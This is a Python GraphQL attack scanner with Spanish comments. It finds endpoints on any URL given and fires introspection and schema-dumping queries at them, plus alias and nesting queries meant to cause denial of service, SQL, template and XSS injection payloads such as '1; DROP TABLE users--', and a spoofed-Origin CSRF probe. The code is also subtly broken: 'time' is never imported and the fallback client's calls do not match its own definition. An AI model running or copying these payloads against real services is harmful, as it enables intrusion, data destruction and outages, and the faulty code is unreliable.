#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GRAPHQL ANALYZER v2.0 - TANQUE EDITION
Introspection · Batch attacks · DoS · Injection · CSRF · Depth limit
"""

import asyncio
import json
import re
import sys
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional
import random

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None
        async def post(self, url, json=None): return None

class GraphQLAnalyzer:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        self.endpoints = []
        
        # Endpoints GraphQL comunes
        self.graphql_paths = [
            '/graphql', '/gql', '/graphiql', '/graphql/console',
            '/v1/graphql', '/v2/graphql', '/api/graphql',
            '/query', '/api/query', '/graph', '/gql.php',
            '/graphql/graphql', '/graphql/query', '/graphql/mutation',
            '/api', '/api/v1', '/api/v2', '/api/gql', '/api/graph',
            '/explorer', '/playground', '/graphql-playground'
        ]
        
        # Introspection queries
        self.introspection_queries = [
            '{__schema{types{name}}}',
            '{__schema{queryType{name}}}',
            '{__schema{mutationType{name}}}',
            '{__schema{subscriptionType{name}}}',
            '{__type(name:"User"){name fields{name type{name}}}}',
            'query{__schema{directives{name}}}'
        ]
        
        # Queries para extraer esquema completo
        self.schema_queries = [
            '''
            query IntrospectionQuery {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                  ...FullType
                }
                directives {
                  name
                  locations
                }
              }
            }
            fragment FullType on __Type {
              kind
              name
              fields(includeDeprecated: true) {
                name
                args {
                  ...InputValue
                }
                type {
                  ...TypeRef
                }
                isDeprecated
                deprecationReason
              }
              inputFields {
                ...InputValue
              }
              interfaces {
                ...TypeRef
              }
              enumValues(includeDeprecated: true) {
                name
                isDeprecated
                deprecationReason
              }
              possibleTypes {
                ...TypeRef
              }
            }
            fragment InputValue on __InputValue {
              name
              type { ...TypeRef }
              defaultValue
            }
            fragment TypeRef on __Type {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
            '''
        ]
        
        # Payloads DoS (depth attacks)
        self.dos_payloads = [
            'query { __typename ' + ' '.join([f'f{i}: __typename' for i in range(100)]) + ' }',
            'query { ' + ''.join([f'f{i}: __typename ' for i in range(50)]) + ' }',
            'query { __typename' + ' { __typename' * 10 + ' }',
        ]
        
        # Payloads de inyección
        self.injection_payloads = [
            "' OR 1=1--",
            '" OR "1"="1',
            ';--',
            "' UNION SELECT 1--",
            '1; DROP TABLE users--',
            '${7*7}',
            '{{7*7}}',
            '<script>alert(1)</script>'
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=15, max_retries=2)
        
    async def detect_endpoints(self) -> List[str]:
        """Detecta endpoints GraphQL activos"""
        endpoints = []
        
        for path in self.graphql_paths:
            url = urljoin(self.url, path)
            try:
                # Probar con query simple
                payload = {'query': '{__typename}'}
                resp = await self.client.post(url, json=payload)
                
                if resp and resp.status == 200:
                    text = await resp.text()
                    if '"data"' in text or '__typename' in text:
                        endpoints.append(url)
                        print(f"   [✓] GraphQL: {url}")
                        
                # Probar GET también
                resp = await self.client.get(url)
                if resp and resp.status == 200:
                    text = await resp.text()
                    if 'graphql' in text.lower() or 'playground' in text.lower():
                        if url not in endpoints:
                            endpoints.append(url)
                            print(f"   [✓] GraphQL UI: {url}")
            except:
                pass
                
        return endpoints
        
    async def test_introspection(self, endpoint: str) -> List[Dict]:
        """Prueba si introspection está habilitada"""
        findings = []
        
        for query in self.introspection_queries:
            try:
                payload = {'query': query}
                resp = await self.client.post(endpoint, json=payload)
                
                if resp and resp.status == 200:
                    text = await resp.text()
                    if '__schema' in text or '__type' in text:
                        findings.append({
                            'type': 'GRAPHQL_INTROSPECTION',
                            'endpoint': endpoint,
                            'severity': 'ALTO',
                            'details': 'Introspection habilitada - Puede exponer todo el esquema'
                        })
                        print(f"   [[WARN]] Introspection habilitada")
                        
                        # Intentar extraer esquema completo
                        if self.aggressive:
                            await self.extract_schema(endpoint)
                        break
            except:
                pass
                
        return findings
        
    async def extract_schema(self, endpoint: str):
        """Intenta extraer el esquema completo"""
        for query in self.schema_queries:
            try:
                payload = {'query': query}
                resp = await self.client.post(endpoint, json=payload)
                
                if resp and resp.status == 200:
                    data = await resp.json()
                    with open(f"graphql_schema_{self.domain}.json", 'w') as f:
                        json.dump(data, f, indent=2)
                    print(f"   [💾] Esquema guardado en graphql_schema_{self.domain}.json")
                    break
            except:
                pass
                
    async def test_batch_queries(self, endpoint: str) -> List[Dict]:
        """Prueba batch queries (pueden ser DoS)"""
        findings = []
        
        # Batch query
        batch = [
            {'query': '{__typename}'},
            {'query': '{__typename}'},
            {'query': '{__typename}'}
        ]
        
        try:
            resp = await self.client.post(endpoint, json=batch)
            if resp and resp.status == 200:
                text = await resp.text()
                if isinstance(text, str) and '[' in text and ']' in text:
                    findings.append({
                        'type': 'GRAPHQL_BATCH',
                        'endpoint': endpoint,
                        'severity': 'MEDIO',
                        'details': 'Batch queries permitidas - Posible DoS'
                    })
                    print(f"   [[INFO]] Batch queries permitidas")
        except:
            pass
            
        return findings
        
    async def test_dos(self, endpoint: str) -> List[Dict]:
        """Prueba ataques DoS (depth, aliases)"""
        findings = []
        
        for payload in self.dos_payloads:
            try:
                start = time.time()
                resp = await self.client.post(endpoint, json={'query': payload})
                elapsed = time.time() - start
                
                if resp and resp.status == 200:
                    if elapsed > 2:  # Respuesta lenta
                        findings.append({
                            'type': 'GRAPHQL_DOS',
                            'endpoint': endpoint,
                            'severity': 'MEDIO',
                            'details': f'Query compleja tomó {elapsed:.2f}s'
                        })
                        print(f"   [[WARN]] Posible DoS: {elapsed:.2f}s")
                        break
            except:
                pass
                
        return findings
        
    async def test_injections(self, endpoint: str) -> List[Dict]:
        """Prueba inyecciones en campos de texto"""
        findings = []
        
        # Primero obtener campos de string del esquema
        string_fields = []
        try:
            query = '{__schema{types{name fields{name type{name}}}}}'
            resp = await self.client.post(endpoint, json={'query': query})
            if resp:
                data = await resp.json()
                # Extraer campos de tipo String
                # (implementación simplificada)
        except:
            pass
            
        # Si no podemos obtener campos, usar genéricos
        test_fields = ['name', 'email', 'username', 'message', 'comment', 'input']
        
        for field in test_fields[:3]:
            for payload in self.injection_payloads[:5]:
                query = f'mutation {{ test(input: {{ {field}: "{payload}" }}) {{ success }} }}'
                try:
                    resp = await self.client.post(endpoint, json={'query': query})
                    if resp and resp.status == 500:
                        text = await resp.text()
                        if 'error' in text.lower() or 'exception' in text.lower():
                            findings.append({
                                'type': 'GRAPHQL_INJECTION',
                                'endpoint': endpoint,
                                'field': field,
                                'payload': payload[:30],
                                'severity': 'ALTO'
                            })
                            print(f"   [[WARN]] Posible inyección en {field}")
                            break
                except:
                    pass
                    
        return findings
        
    async def test_csrf(self, endpoint: str) -> List[Dict]:
        """Prueba vulnerabilidades CSRF"""
        findings = []
        
        # Probar sin Origin/Referer
        headers = {
            'Origin': 'https://evil.com',
            'Referer': 'https://evil.com/phishing'
        }
        
        try:
            payload = {'query': '{__typename}'}
            resp = await self.client.post(endpoint, json=payload, headers=headers)
            
            if resp and resp.status == 200:
                findings.append({
                    'type': 'GRAPHQL_CSRF',
                    'endpoint': endpoint,
                    'severity': 'MEDIO',
                    'details': 'No valida Origin/Referer - Posible CSRF'
                })
                print(f"   [[WARN]] Posible CSRF")
        except:
            pass
            
        return findings
        
    async def scan(self):
        """Ejecuta análisis GraphQL completo"""
        print(f"\n🔮 GRAPHQL ANALYZER v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            # 1. Detectar endpoints
            print("[*] Detectando endpoints GraphQL...")
            self.endpoints = await self.detect_endpoints()
            
            if not self.endpoints:
                print("[!] No se encontraron endpoints GraphQL")
                return []
                
            # 2. Analizar cada endpoint
            for endpoint in self.endpoints:
                print(f"\n[*] Analizando: {endpoint}")
                
                # Introspection
                findings = await self.test_introspection(endpoint)
                self.findings.extend(findings)
                
                # Batch queries
                findings = await self.test_batch_queries(endpoint)
                self.findings.extend(findings)
                
                # DoS
                findings = await self.test_dos(endpoint)
                self.findings.extend(findings)
                
                # Injections
                findings = await self.test_injections(endpoint)
                self.findings.extend(findings)
                
                # CSRF
                findings = await self.test_csrf(endpoint)
                self.findings.extend(findings)
                
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS GRAPHQL")
            print("="*70)
            
            if self.findings:
                altos = [f for f in self.findings if f['severity'] == 'ALTO']
                medios = [f for f in self.findings if f['severity'] == 'MEDIO']
                
                if altos:
                    print(f"\n[WARN]  ALTOS: {len(altos)}")
                    for f in altos:
                        print(f"   • {f['type']}")
                        
                if medios:
                    print(f"\n[INFO] MEDIOS: {len(medios)}")
                    
                print(f"\n[OK] TOTAL: {len(self.findings)}")
            else:
                print("\n[OK] No se encontraron vulnerabilidades")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 graphql_analyzer.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    analyzer = GraphQLAnalyzer(url, aggressive)
    await analyzer.scan()

if __name__ == "__main__":
    asyncio.run(main())
